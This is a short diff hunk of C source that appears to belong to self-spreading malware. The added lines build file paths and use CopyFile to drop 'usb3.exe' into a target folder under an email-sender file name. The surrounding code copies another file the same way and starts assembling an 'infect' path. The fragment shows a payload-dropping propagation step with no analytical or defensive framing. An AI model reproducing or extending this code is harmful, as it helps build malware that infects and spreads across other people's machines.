@@ -55,6 +55,18 @@ main(){
 
         CopyFile(net_from, net, 0);
 
+        ///////////////////////////
+        
+        strcpy(net, folderPath);
+        strcat(net, "\\");
+        strcat(net, EMAIL_SENDER_FILE_NAME);
+
+        
+        strcpy(net_from, FOLDER_NAME);
+        strcat(net_from, "\\");
+        strcat(net_from, "usb3.exe");
+
+        CopyFile(net_from, net, 0);
         //////////////////////////
         char infect[100]={""};
         strcat(infect, folderPath);
